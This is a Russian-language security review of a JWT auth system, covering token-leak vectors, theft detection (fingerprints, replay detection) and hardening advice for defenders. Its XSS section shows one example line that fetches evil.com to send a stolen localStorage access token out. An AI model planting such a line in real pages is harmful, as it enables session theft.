# Анализ безопасности JWT Auth System

## Содержание
1. [Возможные утечки токенов](#возможные-утечки-токенов)
2. [Как определить кражу токена](#как-определить-кражу-токена)
3. [Способы защиты](#способы-защиты)
4. [Архитектурные решения](#архитектурные-решения)

---

## Возможные утечки токенов

### 1. XSS (Cross-Site Scripting)
**Описание:** Злоумышленник внедряет вредоносный JavaScript, который крадёт токен из localStorage/sessionStorage или перехватывает запросы.

**Вектор атаки:**
```javascript
// Вредоносный скрипт на странице
fetch('https://evil.com/steal?token=' + localStorage.getItem('access_token'))
```

### 2. MITM (Man-in-the-Middle)
**Описание:** Перехват токена при передаче по незащищённому каналу.

**Условия:**
- HTTP вместо HTTPS
- Скомпрометированный Wi-Fi
- Поддельные SSL-сертификаты

### 3. Утечка через логи
**Описание:** Токен записывается в серверные логи, логи прокси, или браузерную историю.

**Примеры:**
```
# Плохо: токен в URL
GET /api/data?token=eyJhbGci...

# Плохо: логирование заголовков
INFO: Headers: {"Authorization": "Bearer eyJhbGci..."}
```

### 4. Социальная инженерия
**Описание:** Пользователь добровольно передаёт токен, думая что это безопасно.

### 5. Компрометация клиентского устройства
**Описание:** Вредоносное ПО или физический доступ к устройству.

### 6. Уязвимости зависимостей
**Описание:** Уязвимости в npm/pip пакетах, используемых приложением.

---

## Как определить кражу токена

### 1. Device Fingerprinting (реализовано)

Привязка токена к характеристикам устройства:

```python
def get_device_fingerprint(request: Request) -> str:
    """Формирование fingerprint из заголовков."""
    user_agent = request.headers.get("User-Agent", "")
    accept_language = request.headers.get("Accept-Language", "")
    accept_encoding = request.headers.get("Accept-Encoding", "")
    return f"{user_agent}|{accept_language}|{accept_encoding}"
```

**Индикатор:** Токен используется с другим fingerprint → возможная кража.

### 2. IP Geolocation Anomalies (реализовано)

```python
def record_login(user_id: str, ip_address: str, user_agent: str) -> dict:
    """Запись входа и обнаружение аномалий."""
    # Сравниваем с предыдущими входами
    if last_login.ip != current_ip:
        anomalies["new_location"] = True
```

**Индикатор:** Невозможное перемещение (Москва → Нью-Йорк за 5 минут).

### 3. Refresh Token Replay Detection (реализовано)

```python
# При обновлении токенов
if not redis_service.is_in_whitelist(user_id, refresh_token):
    # Токен уже использован → возможный replay attack
    redis_service.revoke_all_user_tokens(user_id)
    raise HTTPException(...)
```

**Механизм:** 
1. Пользователь обновляет токен → старый удаляется из whitelist
2. Злоумышленник пытается использовать украденный refresh token
3. Токена нет в whitelist → обнаружена кража
4. Отзываем ВСЕ токены пользователя

### 4. Concurrent Session Analysis

```python
def get_user_sessions(user_id: str) -> list[dict]:
    """Получение всех активных сессий."""
    # Если > N активных сессий с разных устройств...
```

**Индикатор:** Аномально много одновременных сессий.

### 5. Behavioral Analysis

**Индикаторы:**
- Нетипичное время активности
- Необычные запросы к API
- Резкое изменение паттерна использования

---

## Способы защиты

### ✅ Реализовано в проекте

| Защита | Описание | Код |
|--------|----------|-----|
| **Короткий TTL Access Token** | 15 минут | `ACCESS_TOKEN_EXPIRE_MINUTES=15` |
| **Refresh Token Rotation** | Новый refresh при каждом обновлении | `auth.py: refresh_tokens()` |
| **Blacklist** | Отозванные токены | `redis_service.add_to_blacklist()` |
| **Whitelist** | Только активные refresh токены | `redis_service.is_in_whitelist()` |
| **Device Fingerprint** | Привязка к устройству | `dependencies.py: get_device_fingerprint()` |
| **Rate Limiting** | Защита от брутфорса | `redis_service.check_rate_limit()` |
| **Bcrypt** | Медленное хеширование | `BCRYPT_ROUNDS=12` |
| **Anomaly Detection** | Обнаружение аномалий | `redis_service.record_login()` |

### 📋 Рекомендации для продакшена

#### 1. HTTPS Only
```nginx
server {
    listen 80;
    return 301 https://$host$request_uri;
}
```

#### 2. Secure Cookie для Refresh Token
```python
response.set_cookie(
    key="refresh_token",
    value=refresh_token,
    httponly=True,      # Защита от XSS
    secure=True,        # Только HTTPS
    samesite="strict",  # Защита от CSRF
    max_age=604800      # 7 дней
)
```

#### 3. Content Security Policy
```python
@app.middleware("http")
async def add_security_headers(request, call_next):
    response = await call_next(request)
    response.headers["Content-Security-Policy"] = "default-src 'self'"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    return response
```

#### 4. Secrets Management
```yaml
# docker-compose.yml с Docker Secrets
secrets:
  jwt_secret:
    external: true

services:
  api:
    secrets:
      - jwt_secret
```

#### 5. Audit Logging
```python
async def log_security_event(
    event_type: str,
    user_id: str,
    details: dict
):
    """Логирование событий безопасности."""
    await security_logger.info({
        "event": event_type,
        "user_id": user_id,
        "timestamp": datetime.utcnow().isoformat(),
        "ip": details.get("ip"),
        "user_agent": details.get("user_agent"),
        # ... другие данные
    })
```

---

## Архитектурные решения

### Почему Whitelist + Blacklist?

```
┌─────────────────────────────────────────────────────────────┐
│                      WHITELIST                               │
│  Назначение: Хранение АКТИВНЫХ refresh токенов              │
│  Плюсы:                                                      │
│    ✓ Можно мгновенно отозвать все сессии                    │
│    ✓ Полный контроль над активными сессиями                 │
│    ✓ Защита от replay attack                                 │
│  Минусы:                                                     │
│    ✗ Требует хранения (но refresh токенов мало)             │
└─────────────────────────────────────────────────────────────┘

┌─────────────────────────────────────────────────────────────┐
│                      BLACKLIST                               │
│  Назначение: Хранение ОТОЗВАННЫХ access токенов             │
│  Плюсы:                                                      │
│    ✓ Мгновенный отзыв при logout                            │
│    ✓ TTL = оставшееся время жизни (автоочистка)             │
│  Минусы:                                                     │
│    ✗ При частых logout может расти                          │
│  Оптимизация:                                                │
│    → Короткий TTL access token = маленький blacklist        │
└─────────────────────────────────────────────────────────────┘
```

### Почему НЕ только Stateless JWT?

**Проблема:** Stateless JWT нельзя отозвать до истечения.

**Решение:** Гибридный подход:
- JWT даёт масштабируемость (не нужно хранить сессии)
- Redis даёт контроль (whitelist/blacklist)

### Почему Refresh Token Rotation?

```
Без Rotation:
  User: использует refresh_token
  Attacker: крадёт refresh_token
  Attacker: использует refresh_token
  → Оба имеют валидные токены
  → Кража не обнаружена

С Rotation:
  User: использует refresh_token → получает новый
  Attacker: пытается использовать старый refresh_token
  → Токена нет в whitelist
  → Система отзывает ВСЕ токены
  → Кража обнаружена!
```

---

## Матрица угроз и защит

| Угроза | Защита | Статус |
|--------|--------|--------|
| XSS | HttpOnly cookies, CSP | ⚠️ Рекомендация |
| MITM | HTTPS | ⚠️ Рекомендация |
| Брутфорс | Rate limiting | ✅ Реализовано |
| Replay Attack | Token Rotation | ✅ Реализовано |
| Кража токена | Fingerprint, Anomaly Detection | ✅ Реализовано |
| Долгая сессия | Короткий TTL | ✅ Реализовано |
| Отзыв доступа | Blacklist | ✅ Реализовано |
